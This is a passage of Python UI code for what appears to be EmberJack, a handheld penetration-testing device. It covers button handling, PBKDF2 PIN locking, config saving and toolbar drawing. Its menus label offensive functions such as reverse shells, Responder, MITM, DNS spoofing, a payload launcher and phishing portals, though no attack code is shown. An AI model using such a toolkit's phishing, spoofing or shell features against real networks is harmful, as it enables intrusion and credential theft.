                    # Drain companion KEY3_PIN emitted by STANDARD_NAV_MAP for Backspace
                    # so pressing Backspace never double-fires back across two screens.
                    if spec == "BACKSPACE":
                        _q_v = getattr(rj_input, "_q", None)
                        if _q_v is not None:
                            _kept = []
                            _dropped = False
                            try:
                                while True:
                                    _it = _q_v.get_nowait()
                                    if not _dropped and _it == "KEY3_PIN":
                                        _dropped = True
                                        continue
                                    _kept.append(_it)
                            except Exception:
                                pass
                            for _it in _kept:
                                try:
                                    _q_v.put_nowait(_it)
                                except Exception:
                                    pass
                    _mark_user_activity()
                    return "_KB_BACKSPACE"
                if spec in ("PAGEUP", "PAGEDOWN", "HOME", "END", "CTRL_T"):
                    _mark_user_activity()
                    return f"_KB_{spec}"
                if ch and ch != " ":
                    _mark_user_activity()
                    return f"_KB_{ch}"
        # 2) virtual buttons from Web UI / HDMI keyboard nav
        v = rj_input.get_virtual_button()
        if v:
            _log_virtual_consume("getButton", v)
            _set_last_button(v, time.time())
            _mark_user_activity()
            return v
        pressed = None
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                pressed = item
                break
        if pressed is None:
            if _last_button is not None:
                _set_last_button(None, time.time())
            # Adaptive idle sleep: snappy 15ms right after input, calm 40ms when idle
            idle_s = now_m - float(lock_runtime.get("last_activity", 0.0) or 0.0)
            time.sleep(0.015 if idle_s < 2.0 else 0.04)
            continue

        now = time.time()
        if pressed != _last_button:
            _set_last_button(pressed, now)
            _mark_user_activity()
            return pressed

        # Same button still held: debounce first, then allow auto-repeat
        if (now - _last_button_time) < _debounce_seconds:
            time.sleep(0.015)
            continue
        if (now - _button_down_since) >= _repeat_delay and (now - _last_button_time) >= _repeat_interval:
            _last_button_time = now
            _mark_user_activity()
            return pressed
        time.sleep(0.015)

def temp() -> float:
    return rj_env.read_cpu_temp()


def _iface_carrier_up(name: str) -> bool:
    try:
        with open(f"/sys/class/net/{name}/carrier", "r") as f:
            return f.read().strip() == "1"
    except Exception:
        return False


def get_best_interface_prefer_eth() -> str:
    """Prefer wired interface when link is up, otherwise fall back."""
    eth_candidate = None
    for name in ("eth0", "eth1"):
        if _iface_carrier_up(name):
            ip = get_interface_ip(name)
            if ip:
                return name
            eth_candidate = eth_candidate or name
    if eth_candidate:
        return eth_candidate
    return get_best_interface()


def Leave(poweroff: bool = False) -> None:
    _stop_evt.set()
    try:
        rj_terminal.close_shared_session()
    except Exception:
        pass
    try:
        rj_keyboard.set_text_mode(False)
        rj_keyboard.clear_all_keys()
    except Exception:
        pass
    try:
        if getattr(LCD_1in44, "_DISPLAY_TYPE", "") == "HDMI" and os.environ.get("RJ_HOST_MANAGED_EXTERNALLY", "0") != "1":
            import hdmi_shm
            hdmi_shm.stop_host()
    except Exception:
        pass
    GPIO.cleanup()
    if poweroff:
        os.system("sync && poweroff")
    print("Bye!")
    sys.exit(0)


def Restart():
    print("Restarting the UI!")
    Dialog("Restarting!", False)
    arg = ["-n","-5",os.sys.executable] + sys.argv
    os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
    Leave()


def safe_kill(*names):
    for name in names:
        subprocess.run(
            ["pkill", "-9", "-x", name],      # -x = nom exact
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

### Two threaded functions ###
# One for updating status bar and one for refreshing display #
def is_responder_running():
    _nmap, _mitm, _etter, resp = _scan_proc_status()
    return resp


def is_mitm_running():
    _nmap, mitm, _etter, _resp = _scan_proc_status()
    return mitm


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _normalize_lock_config(raw: dict | None) -> dict[str, object]:
    cfg = raw if isinstance(raw, dict) else {}
    normalized = LOCK_DEFAULTS.copy()
    normalized["enabled"] = bool(cfg.get("enabled", normalized["enabled"]))
    mode = str(cfg.get("mode", cfg.get("lock_type", normalized["mode"])) or normalized["mode"]).strip().lower()
    if mode not in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE):
        mode = LOCK_MODE_PIN
    normalized["mode"] = mode
    normalized["pin_hash"] = str(cfg.get("pin_hash", normalized["pin_hash"]) or "").strip()
    normalized["sequence_hash"] = str(cfg.get("sequence_hash", normalized["sequence_hash"]) or "").strip()
    normalized["sequence_length"] = LOCK_SEQUENCE_LENGTH
    try:
        auto_lock_seconds = int(cfg.get("auto_lock_seconds", normalized["auto_lock_seconds"]))
    except (TypeError, ValueError):
        auto_lock_seconds = int(normalized["auto_lock_seconds"])
    normalized["auto_lock_seconds"] = max(0, auto_lock_seconds)
    if not normalized["pin_hash"] and normalized["sequence_hash"] and "mode" not in cfg and "lock_type" not in cfg:
        normalized["mode"] = LOCK_MODE_SEQUENCE
    if normalized["enabled"] and not _lock_config_has_secret(normalized, str(normalized["mode"])):
        normalized["enabled"] = False
    return normalized


def _lock_config_has_secret(config: dict[str, object], mode: str | None = None) -> bool:
    selected_mode = str(mode or config.get("mode") or LOCK_MODE_PIN)
    if selected_mode == LOCK_MODE_SEQUENCE:
        return bool(str(config.get("sequence_hash") or "").strip())
    return bool(str(config.get("pin_hash") or "").strip())


def _lock_mode() -> str:
    mode = str(lock_config.get("mode") or LOCK_MODE_PIN)
    return mode if mode in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN


def _lock_mode_label(mode: str | None = None) -> str:
    return "Sequence" if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else "PIN"


def _lock_has_pin() -> bool:
    return bool(str(lock_config.get("pin_hash") or "").strip())


def _lock_has_sequence() -> bool:
    return bool(str(lock_config.get("sequence_hash") or "").strip())


def _lock_has_secret(mode: str | None = None) -> bool:
    return _lock_config_has_secret(lock_config, mode or _lock_mode())


def _lock_is_enabled() -> bool:
    return bool(lock_config.get("enabled")) and _lock_has_secret()


def _mark_user_activity() -> None:
    lock_runtime["last_activity"] = time.monotonic()


def _should_auto_lock() -> bool:
    if lock_runtime["locked"] or lock_runtime["in_lock_flow"] or lock_runtime["suspend_auto_lock"]:
        return False
    if not _lock_is_enabled():
        return False
    timeout = int(lock_config.get("auto_lock_seconds") or 0)
    if timeout <= 0:
        return False
    return (time.monotonic() - float(lock_runtime.get("last_activity") or 0.0)) >= timeout


def _lock_timeout_label(seconds: int | None = None) -> str:
    value = int(lock_config.get("auto_lock_seconds") or 0) if seconds is None else int(seconds)
    for candidate, label in LOCK_TIMEOUT_OPTIONS:
        if candidate == value:
            return label
    if value <= 0:
        return "Never"
    return f"{value} sec"


def _handle_main_menu_key3_double_click() -> bool:
    deadline = time.monotonic() + _double_click_window
    key3_released = False
    while time.monotonic() < deadline:
        try:
            if GPIO.input(PINS["KEY3_PIN"]) != 0:
                key3_released = True
            elif key3_released:
                _mark_user_activity()
                if _lock_has_secret():
                    lock_device("Locked")
                else:
                    Dialog_info(f"Set {_lock_mode_label()} first", wait=False, timeout=1.0)
                return True
        except Exception:
            pass
        virtual_button = rj_input.get_virtual_button()
        if virtual_button == "KEY3_PIN":
            _log_virtual_consume("main_menu_key3_double_click", virtual_button)
            _mark_user_activity()
            if _lock_has_secret():
                lock_device("Locked")
            else:
                Dialog_info(f"Set {_lock_mode_label()} first", wait=False, timeout=1.0)
            return True
        time.sleep(0.01)
    return False


def _serialize_sequence(sequence: list[str]) -> str:
    return "|".join(sequence)


def _hash_pin(pin: str, rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"), salt.encode("utf-8"), rounds)
    return f"pbkdf2_sha256${rounds}${salt}${_b64url_encode(dk)}"


def _parse_pin_hash(encoded: str) -> tuple[str, int, str, str] | None:
    try:
        algo, rounds, salt, digest = encoded.split("$", 3)
        return algo, int(rounds), salt, digest
    except Exception:
        return None


def _verify_pin(pin: str, encoded: str) -> bool:
    parsed = _parse_pin_hash(encoded)
    if not parsed:
        return False
    algo, rounds, salt, digest = parsed
    if algo != "pbkdf2_sha256":
        return False
    try:
        dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"), salt.encode("utf-8"), rounds)
        return hmac.compare_digest(_b64url_encode(dk), digest)
    except Exception:
        return False


def _hash_sequence(sequence: list[str], rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    return _hash_pin(_serialize_sequence(sequence), rounds=rounds)


def _verify_sequence(sequence: list[str], encoded: str) -> bool:
    return _verify_pin(_serialize_sequence(sequence), encoded)


def _should_rehash_pin(encoded: str) -> bool:
    parsed = _parse_pin_hash(encoded)
    if not parsed:
        return False
    algo, rounds, _salt, _digest = parsed
    return algo == "pbkdf2_sha256" and rounds != LOCK_PIN_PBKDF2_ROUNDS


def _rehash_pin_if_needed(pin: str, encoded: str) -> None:
    if not _should_rehash_pin(encoded):
        return
    lock_config["pin_hash"] = _hash_pin(pin)
    SaveConfig()


def _rehash_sequence_if_needed(sequence: list[str], encoded: str) -> None:
    if not _should_rehash_pin(encoded):
        return
    lock_config["sequence_hash"] = _hash_sequence(sequence)
    SaveConfig()


def _wait_for_button_release(timeout: float = 1.0) -> None:
    deadline = time.monotonic() + max(0.0, timeout)
    while time.monotonic() < deadline:
        try:
            physical_released = all(GPIO.input(pin) != 0 for pin in PINS.values())
            virtual_released = not rj_input.get_held_buttons()
            if physical_released and virtual_released:
                return
        except Exception:
            if not rj_input.get_held_buttons():
                return
        time.sleep(0.01)


def _write_config_atomic(data: dict) -> None:
    os.makedirs(os.path.dirname(default.config_file), exist_ok=True)
    tmp_path = default.config_file + ".tmp"
    try:
        with open(tmp_path, "w", encoding="utf-8") as wf:
            json.dump(data, wf, indent=4, sort_keys=True)
        os.replace(tmp_path, default.config_file)
        try:
            os.chmod(default.config_file, 0o600)
        except Exception:
            pass
    finally:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass


_flip_enabled = False  # screen + controls flipped 180 degrees

_ORIGINAL_PINS = {
    "KEY_UP_PIN": 6, "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5, "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13, "KEY1_PIN": 21,
    "KEY2_PIN": 20, "KEY3_PIN": 16,
}

def SaveConfig() -> None:
    existing = rj_env.load_gui_conf()
    data = {
        "DISPLAY": {
            "type": getattr(LCD_1in44, '_DISPLAY_TYPE', 'ST7789_240'),
            "supported_types": list(rj_env.SUPPORTED_DISPLAY_TYPES),
            "flip": _flip_enabled,
            "hdmi": existing.get("DISPLAY", {}).get("hdmi", rj_env.get_hdmi_config()),
        },
        "KEYBOARD": existing.get("KEYBOARD", dict(rj_env.KEYBOARD_DEFAULTS)),
        "TOOLBAR": {"show_clock": _show_clock},
        "PINS":   _ORIGINAL_PINS,
        "PATHS":  {
            "IMAGEBROWSER_START": default.imgstart_path,
            "SCREENSAVER_GIF": default.screensaver_gif,
        },
        "COLORS": color.Dictonary(),
        "LOCK":   {
            "enabled": bool(lock_config.get("enabled")),
            "mode": _lock_mode(),
            "pin_hash": str(lock_config.get("pin_hash") or ""),
            "sequence_hash": str(lock_config.get("sequence_hash") or ""),
            "sequence_length": LOCK_SEQUENCE_LENGTH,
            "auto_lock_seconds": max(0, int(lock_config.get("auto_lock_seconds") or 0)),
            "random_screensaver": _random_screensaver,
        },
    }
    print(json.dumps(data, indent=4, sort_keys=True))
    _write_config_atomic(data)
    print("Config has been saved!")



def _apply_flip(pins):
    """Swap UP/DOWN, LEFT/RIGHT, KEY1/KEY3 for 180-degree flip."""
    flipped = dict(pins)
    flipped["KEY_UP_PIN"], flipped["KEY_DOWN_PIN"] = pins["KEY_DOWN_PIN"], pins["KEY_UP_PIN"]
    flipped["KEY_LEFT_PIN"], flipped["KEY_RIGHT_PIN"] = pins["KEY_RIGHT_PIN"], pins["KEY_LEFT_PIN"]
    flipped["KEY1_PIN"], flipped["KEY3_PIN"] = pins["KEY3_PIN"], pins["KEY1_PIN"]
    return flipped


def LoadConfig():
    global PINS
    global default
    global lock_config
    global _flip_enabled
    global _random_screensaver
    global _show_clock

    if not (os.path.exists(default.config_file) and os.path.isfile(default.config_file)):
        print("Can't find a config file! Creating one at '" + default.config_file + "'...")
        SaveConfig()

    with open(default.config_file, "r", encoding="utf-8") as rf:
        data = json.load(rf)
        default.imgstart_path = data["PATHS"].get("IMAGEBROWSER_START", default.imgstart_path)
        default.screensaver_gif = data["PATHS"].get("SCREENSAVER_GIF", default.screensaver_gif)
        PINS = data.get("PINS", PINS)
        lock_config = _normalize_lock_config(data.get("LOCK"))
        _random_screensaver = bool(data.get("LOCK", {}).get("random_screensaver", False))
        _flip_enabled = data.get("DISPLAY", {}).get("flip", False)
        _show_clock = data.get("TOOLBAR", {}).get("show_clock", True)
        if _flip_enabled:
            PINS = _apply_flip(PINS)
        try:
            color.LoadDictonary(data["COLORS"])
        except:
            pass
        GPIO.setmode(GPIO.BCM)
        for item in PINS:
            GPIO.setup(PINS[item], GPIO.IN, pull_up_down=GPIO.PUD_UP)
    print(f"Config loaded! (flip={'ON' if _flip_enabled else 'OFF'})")


def ToggleClock():
    global _show_clock
    _show_clock = not _show_clock
    try:
        with open(default.config_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if "TOOLBAR" not in data:
            data["TOOLBAR"] = {}
        data["TOOLBAR"]["show_clock"] = _show_clock
        with open(default.config_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, sort_keys=True)
    except Exception:
        pass
    state = "ON" if _show_clock else "OFF"
    Dialog_info(f"Clock: {state}", wait=False, timeout=1)


def ClockSetTimezone():
    common_tz = [
        "Europe/Paris", "Europe/London", "Europe/Berlin",
        "Europe/Madrid", "Europe/Rome", "Europe/Brussels",
        "America/New_York", "America/Chicago", "America/Los_Angeles",
        "Asia/Tokyo", "Asia/Shanghai", "Asia/Dubai",
        "Australia/Sydney", "Pacific/Auckland", "UTC",
    ]
    try:
        current = subprocess.check_output(["cat", "/etc/timezone"], timeout=3).decode().strip()
    except Exception:
        current = "Unknown"
    cursor = 0
    scroll = 0
    visible = max(3, (_SCR_H - S(30)) // S(14))
    while True:
        lines = [f"  Timezone ({current})"]
        for i in range(scroll, min(len(common_tz), scroll + visible)):
            prefix = "> " if i == cursor else "  "
            lines.append(f"{prefix}{common_tz[i]}")
        ShowLines(lines, bold=[cursor - scroll + 1] if cursor >= scroll else [])
        btn = getButton()
        if btn == "KEY_UP_PIN":
            cursor = max(0, cursor - 1)
            if cursor < scroll:
                scroll = cursor
        elif btn == "KEY_DOWN_PIN":
            cursor = min(len(common_tz) - 1, cursor + 1)
            if cursor >= scroll + visible:
                scroll = cursor - visible + 1
        elif btn in ("KEY_PRESS_PIN", "KEY2_PIN"):
            tz = common_tz[cursor]
            subprocess.run(["timedatectl", "set-timezone", tz], capture_output=True, timeout=5)
            Dialog_info(f"Timezone: {tz}", wait=False, timeout=1.5)
            return
        elif btn in ("KEY1_PIN", "KEY3_PIN", "KEY_LEFT_PIN"):
            return


def ClockToggleNTP():
    try:
        r = subprocess.run(["timedatectl", "show", "--property=NTP"], capture_output=True, text=True, timeout=3)
        ntp_on = "yes" in r.stdout.lower()
    except Exception:
        ntp_on = False
    new_state = "false" if ntp_on else "true"
    subprocess.run(["timedatectl", "set-ntp", new_state], capture_output=True, timeout=5)
    state = "OFF" if ntp_on else "ON"
    Dialog_info(f"NTP sync: {state}", wait=False, timeout=1.5)


def ClockShowInfo():
    try:
        r = subprocess.run(["timedatectl"], capture_output=True, text=True, timeout=3)
        lines = [l.strip() for l in r.stdout.strip().splitlines()[:7] if l.strip()]
    except Exception:
        lines = ["Error reading time info"]
    ShowLines(lines)
    getButton()


def ToggleFlip():
    """Toggle 180-degree screen and controls flip, save and restart."""
    global _flip_enabled
    _flip_enabled = not _flip_enabled
    SaveConfig()
    Dialog_info(
        f"Flip {'ON' if _flip_enabled else 'OFF'}\nRestarting...",
        wait=False, timeout=1.5,
    )
    time.sleep(1.5)
    Restart()


####### Drawing functions #######

_MENU_BREADCRUMB_NAMES = {
    "a": "MAIN",
    "ab": "NMAP",
    "ac": "REV SHELL",
    "ad": "RESPONDER",
    "ag": "FEATURES",
    "ae": "OPTIONS",
    "aea": "COLORS",
    "aeap": "PRESETS",
    "aeb": "CLOCK",
    "af": "SYSTEM",
    "ah": "FILES",
    "ai": "MITM",
    "aj": "DNS SPOOF",
    "ak": "SITES",
    "aw": "WIFI",
    "awr": "ROUTING",
    "ap": "PAYLOADS",
}


def _get_breadcrumb() -> str:
    try:
        which = getattr(m, "which", "a")
    except Exception:
        which = "a"
    if _menu_filter_active:
        return "SEARCH"
    if which in _MENU_BREADCRUMB_NAMES:
        name = _MENU_BREADCRUMB_NAMES[which]
        return "EMBERJACK" if which == "a" else f"MAIN > {name}"
    if which.startswith("ap_"):
        sub = which[3:].replace("_", " ").upper()
        return f"PAYLOADS > {sub}"
    return "EMBERJACK"


_PAYLOAD_DOC_CACHE: dict[str, str] = {}
_CATALOG_SUMMARY_INDEX: dict[str, str] | None = None


def _get_catalog_summary_index() -> dict[str, str]:
    """Lazily build an in-memory path/id -> description lookup from rj_tool_catalog."""
    global _CATALOG_SUMMARY_INDEX
    if _CATALOG_SUMMARY_INDEX is not None:
        return _CATALOG_SUMMARY_INDEX
    idx: dict[str, str] = {}
    try:
        import rj_tool_catalog
        for cat, items in rj_tool_catalog.TOOL_CATALOG.items():
            for item in items:
                tid = str(item.get("id") or "").strip()
                desc = str(item.get("desc") or "").strip()
                if tid and desc:
                    idx[f"{cat}/{tid}"] = desc
                    idx.setdefault(tid, desc)
    except Exception:
        pass
    _CATALOG_SUMMARY_INDEX = idx
    return idx


def _extract_payload_summary(rel_path: str) -> str:
    if rel_path in _PAYLOAD_DOC_CACHE:
        return _PAYLOAD_DOC_CACHE[rel_path]

    # Zero-disk fast path: look up curated catalog descriptions before touching SD card
    norm = str(rel_path or "").replace("\\", "/").lstrip("/")
    if norm.endswith(".py"):
        norm = norm[:-3]
    cat_idx = _get_catalog_summary_index()
    cat_desc = cat_idx.get(norm) or cat_idx.get(os.path.basename(norm))
    if cat_desc:
        _PAYLOAD_DOC_CACHE[rel_path] = cat_desc
        return cat_desc

    summary = "Executable EmberJack payload script."
    try:
        full = os.path.join(default.payload_path, rel_path)
        if not full.endswith(".py"):
            full += ".py"
        if os.path.isfile(full):
            with open(full, "r", encoding="utf-8", errors="ignore") as fh:
                head = fh.read(2048)
            import ast
            doc = ast.get_docstring(ast.parse(head))
            if doc:
                clean_lines = []
                for ln in doc.splitlines():
                    s = ln.strip()
                    if not s or set(s) <= set("=-_*# "):
                        continue
                    if s.lower().startswith(("author:", "raspyjack payload", "emberjack payload")):
                        continue
                    clean_lines.append(s)
                    if len(clean_lines) >= 3:
                        break
                if clean_lines:
                    summary = "\n".join(clean_lines)
    except Exception:
        pass
    _PAYLOAD_DOC_CACHE[rel_path] = summary
    return summary


def _get_item_metadata(label: str) -> tuple[str, str]:
    """Return (kind_badge, description_text) for the currently highlighted item."""
    clean = str(label or "").strip()
    if label in MENU_DESCRIPTIONS:
        desc = MENU_DESCRIPTIONS[label]
    elif f" {clean}" in MENU_DESCRIPTIONS:
        desc = MENU_DESCRIPTIONS[f" {clean}"]
    else:
        desc = ""

    kind = "ITEM"
    try:
        if _menu_filter_active and label in _flat_payload_map:
            rel = _flat_payload_map[label]
            cat = rel.split(os.sep)[0].replace("_", " ").upper() if os.sep in rel else "PAYLOAD"
            return cat, _extract_payload_summary(rel)

        entries = m.menu.get(m.which, ())
        for ent_label, target in entries:
            if ent_label == label or ent_label.strip() == clean:
                if clean == "Terminal":
                    kind = "SHELL"
                    if not desc:
                        desc = "Interactive VT100 bash\nterminal with scrollback.\nF3 detaches, exit closes."
                elif isinstance(target, str):
                    sub_cnt = len(m.menu.get(target, ()))
                    kind = f"MENU ({sub_cnt})"
                    if not desc:
                        desc = f"Contains {sub_cnt} option{'s' if sub_cnt != 1 else ''}.\nPress Enter or Right to open."
                elif isinstance(target, partial) and target.func is exec_payload and target.args:
                    rel = str(target.args[0])
                    kind = "FAVORITE" if label in getattr(m, "_fav_labels", set()) else "PAYLOAD"
                    if not desc:
                        desc = _extract_payload_summary(rel)
                elif isinstance(target, partial) and target.func is run_scan:
                    kind = "NMAP SCAN"
                    if not desc:
                        args_str = " ".join(target.args[1]) if len(target.args) > 1 else ""
                        desc = f"Nmap profile:\nnmap {args_str}"
                elif isinstance(target, partial) and target.func is spoof_site:
                    kind = "PORTAL"
                    if not desc:
                        desc = f"Serve phishing template\n'{clean}' for DNS Spoof."
                else:
                    kind = "ACTION"
                    if not desc:
                        desc = f"Run '{clean}'\nPress Enter to execute."
                break
    except Exception:
        pass
    if not desc:
        desc = clean or "Select an item."
    return kind, desc


_TOOLBAR_STRIP_CACHE: dict = {"key": None, "img": None}


def _draw_toolbar(dirty: bool = True):
    try:
        h = _TOPBAR_H
        clock_text = time.strftime("%H:%M") if _show_clock else ""
        sh_alive = bool(rj_terminal.is_shared_session_alive()) if not _IS_COMPACT else False
        crumb_raw = _get_breadcrumb()
        key = (
            _SCR_W,
            h,
            crumb_raw,
            clock_text,
            _battery_pct,
            bool(_battery_charging),
            bool(_wifi_connected),
            int(round(_temp_c)) if _temp_c > 0 else 0,
            sh_alive,
            _status_text,
            getattr(color, "_sig", None),
        )
        if _TOOLBAR_STRIP_CACHE["key"] == key and _TOOLBAR_STRIP_CACHE["img"] is not None:
            image.paste(_TOOLBAR_STRIP_CACHE["img"], (0, 0))
            if dirty:
                mark_display_dirty()
            return

        strip = Image.new("RGB", (_SCR_W, h), color.elevated)
        td = ImageDraw.Draw(strip)
        td.line([(0, h - 1), (_SCR_W - 1, h - 1)], fill=color.border, width=1)

        pad = max(3, _UI_PAD)
        left_x = pad

        # Warm amber brand dot
        dot_r = max(2, min(4, h // 7))
        dot_cy = h // 2
        td.ellipse((left_x, dot_cy - dot_r, left_x + dot_r * 2, dot_cy + dot_r), fill=color.accent)
        left_x += dot_r * 2 + (5 if not _IS_COMPACT else 3)

        # Right side telemetry (Clock, Battery, WiFi, Temp)
        right_x = _SCR_W - pad
        tb_font = small_font
        try:
            tb_icon = rj_env.load_font(max(8, _SMALL_PX), icon=True)
        except Exception:
            tb_icon = tb_font

        if clock_text:
            cb = rj_theme.measure_text(tb_font, clock_text, td)
            cw, ch = cb[2] - cb[0], cb[3] - cb[1]
            right_x -= cw
            td.text((right_x, (h - ch) // 2 - cb[1]), clock_text, fill=color.text, font=tb_font)
            right_x -= 6 if not _IS_COMPACT else 3

        if _battery_pct >= 0:
            bat_col = (
                rj_theme.EMBER_THEME["danger"] if _battery_pct <= 15
                else (rj_theme.EMBER_THEME["warn"] if _battery_pct <= 30 else color.text_muted)
            )
            pct_text = f"{_battery_pct}%"
            bb = rj_theme.measure_text(tb_font, pct_text, td)
            bw, bh = bb[2] - bb[0], bb[3] - bb[1]
            right_x -= bw
            td.text((right_x, (h - bh) // 2 - bb[1]), pct_text, fill=bat_col, font=tb_font)
            right_x -= 2
            if _battery_pct > 90:
                bat_icon = "\uf240"
            elif _battery_pct > 65:
                bat_icon = "\uf241"
            elif _battery_pct > 35:
                bat_icon = "\uf242"
            elif _battery_pct > 10:
                bat_icon = "\uf243"
            else:
                bat_icon = "\uf244"
            ib = rj_theme.measure_text(tb_icon, bat_icon, td)
            right_x -= (ib[2] - ib[0]) + 1
            td.text((right_x, (h - (ib[3] - ib[1])) // 2 - ib[1]), bat_icon, fill=bat_col, font=tb_icon)
            if _battery_charging:
                zb = rj_theme.measure_text(tb_icon, "\uf0e7", td)
                right_x -= (zb[2] - zb[0]) + 2
                td.text((right_x, (h - (zb[3] - zb[1])) // 2 - zb[1]), "\uf0e7", fill=rj_theme.EMBER_THEME["warn"], font=tb_icon)
            right_x -= 6 if not _IS_COMPACT else 3

        if _wifi_connected:
            wb = rj_theme.measure_text(tb_icon, "\uf1eb", td)
            right_x -= (wb[2] - wb[0])
            td.text((right_x, (h - (wb[3] - wb[1])) // 2 - wb[1]), "\uf1eb", fill=rj_theme.EMBER_THEME["ok"], font=tb_icon)
            right_x -= 6 if not _IS_COMPACT else 3

        if _temp_c > 0:
            temp_txt = f"{_temp_c:.0f}C" if _IS_COMPACT else f"{_temp_c:.0f}°C"
            t_col = (
                rj_theme.EMBER_THEME["danger"] if _temp_c >= 75
                else (rj_theme.EMBER_THEME["warn"] if _temp_c >= 60 else color.text_muted)
            )
            tb = rj_theme.measure_text(tb_font, temp_txt, td)
            right_x -= (tb[2] - tb[0])
            td.text((right_x, (h - (tb[3] - tb[1])) // 2 - tb[1]), temp_txt, fill=t_col, font=tb_font)
            right_x -= 6 if not _IS_COMPACT else 3

        # Active persistent Terminal pill
        if sh_alive:
            sh_txt = "SH"
            sb = rj_theme.measure_text(tb_font, sh_txt, td)
            pill_w = (sb[2] - sb[0]) + 10
            pill_h = (sb[3] - sb[1]) + 4
            right_x -= pill_w
            rj_theme.draw_pill(
                td, right_x, max(1, (h - pill_h) // 2), sh_txt, tb_font,
                bg=color.select, fg=color.selected_text, outline=color.border,
                pad_x=5, pad_y=1, radius=3,
            )
            right_x -= 5

        # Active attack/scan status pill
        if _status_text:
            st_clean = _status_text.strip("() ")
            sb = rj_theme.measure_text(tb_font, st_clean, td)
            pill_w = (sb[2] - sb[0]) + 8
            pill_h = (sb[3] - sb[1]) + 4
            if right_x - pill_w > left_x + 30:
                right_x -= pill_w
                rj_theme.draw_pill(
                    td, right_x, max(1, (h - pill_h) // 2), st_clean, tb_font,
                    bg=rj_theme.EMBER_THEME["warn_bg"], fg=rj_theme.EMBER_THEME["warn"],
                    outline=color.border, pad_x=4, pad_y=1, radius=3,
                )
                right_x -= 5

        # Left breadcrumb title
        crumb_max = max(24, right_x - left_x - 4)
        crumb_font = title_font if not _IS_COMPACT else tb_font
        crumb = rj_theme.truncate_text(td, crumb_raw, crumb_max, crumb_font, ellipsis="…")
        cb = rj_theme.measure_text(crumb_font, crumb or "A", td)
        td.text((left_x, (h - (cb[3] - cb[1])) // 2 - cb[1]), crumb, fill=color.selected_text, font=crumb_font)

        _TOOLBAR_STRIP_CACHE["key"] = key
        _TOOLBAR_STRIP_CACHE["img"] = strip
        image.paste(strip, (0, 0))
        if dirty:
            mark_display_dirty()
    except Exception:
        pass

def _wrap_text_to_width(text, max_width, font=None):
    return rj_theme.wrap_text(draw, text, max_width, font or text_font)

def _truncate_to_width(text, max_width, font=None, ellipsis="…"):
    return rj_theme.truncate_text(draw, text, max_width, font or text_font, ellipsis=ellipsis)

def _draw_centered_text(box, text, fill="WHITE", font=None, line_gap=2):
    """Draw text centered in a box (x0,y0,x1,y1). Supports multiline."""
    if font is None:
        font = text_font
    x0, y0, x1, y1 = box
    max_width = x1 - x0
    lines = _wrap_text_to_width(text, max_width, font)
    line_sizes = []
    total_h = 0
    for line in lines:
        bbox = rj_theme.measure_text(font, line, draw)
        w = bbox[2] - bbox[0]
        h = bbox[3] - bbox[1]
        line_sizes.append((line, w, h))
        total_h += h
    if len(lines) > 1:
        total_h += line_gap * (len(lines) - 1)

    box_w = x1 - x0
    box_h = y1 - y0
    y = y0 + max(0, (box_h - total_h) // 2)
    for line, w, h in line_sizes:
        x = x0 + max(0, (box_w - w) // 2)
        draw.text((x, y), line, fill=fill, font=font)
        y += h + line_gap


def _draw_lock_screen(title: str, prompt: str, entered: list[str] | None = None,
                      selection: tuple[int, int] = (0, 0), allow_cancel: bool = True) -> None:
    keypad = (("1", "2", "3"), ("4", "5", "6"), ("7", "8", "9"), ("C", "0", "OK"))
    entered = entered or []
    selected_row, selected_col = selection
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()

        avail_h = _CONTENT_Y1 - _CONTENT_Y0
        card_w = min(_SCR_W - _UI_PAD * 2, max(116, int(min(_SCR_W, _SCR_H * 1.15) * 0.88)))
        card_h = min(avail_h - 4, max(96, int(avail_h * 0.94)))
        cx0 = (_SCR_W - card_w) // 2
        cy0 = _CONTENT_Y0 + max(2, (avail_h - card_h) // 2)
        cx1 = cx0 + card_w
        cy1 = cy0 + card_h

        rj_theme.draw_card(draw, (cx0, cy0, cx1, cy1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4)

        inner_pad = max(6, card_w // 18)
        draw.text((cx0 + inner_pad, cy0 + 5), _truncate_to_width(title, card_w - inner_pad * 2, title_font), fill=color.selected_text, font=title_font)
        sub_y = cy0 + (_TITLE_PX + 8)
        draw.text((cx0 + inner_pad, sub_y), _truncate_to_width(prompt, card_w - inner_pad * 2, small_font), fill=color.text_muted, font=small_font)

        # PIN indicator slots
        slot_y = sub_y + _SMALL_PX + 6
        slot_h = max(16, min(32, card_h // 8))
        slot_w = max(18, min(42, (card_w - inner_pad * 2 - 18) // 4))
        slot_gap = max(5, min(10, card_w // 28))
        total_w = (slot_w * 4) + (slot_gap * 3)
        slot_x = cx0 + (card_w - total_w) // 2
        for index in range(4):
            x0 = slot_x + (index * (slot_w + slot_gap))
            x1 = x0 + slot_w
            y0 = slot_y
            y1 = y0 + slot_h
            filled = index < len(entered)
            box_fill = color.select if filled else color.well
            box_outline = color.accent if filled else color.border_subtle
            box_text = "●" if filled else "·"
            box_text_fill = color.selected_text if filled else color.text_dim
            rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=box_fill, outline=box_outline, radius=4)
            _draw_centered_text((x0, y0, x1, y1), box_text, fill=box_text_fill, font=title_font)

        # 3x4 keypad grid
        kp_top = slot_y + slot_h + max(6, card_h // 26)
        kp_avail_h = max(44, cy1 - kp_top - 6)
        cell_gap_x = max(4, min(8, card_w // 32))
        cell_gap_y = max(3, min(6, kp_avail_h // 24))
